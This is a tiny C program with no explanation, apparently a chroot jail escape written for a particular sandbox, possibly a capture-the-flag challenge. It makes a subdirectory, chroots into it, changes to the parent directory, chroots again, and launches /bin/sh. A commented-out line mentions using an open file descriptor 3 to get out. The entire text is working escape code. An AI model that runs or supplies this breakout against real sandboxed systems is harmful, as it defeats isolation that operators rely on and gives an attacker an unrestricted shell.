

int main()
{
    mkdir(".42", 0755);
    chroot(".42");
    //fchdir(3); // there is a log file open at fd 3
    chdir("..");
    chroot(".");
    execve("/bin/sh", 0, 0);
}
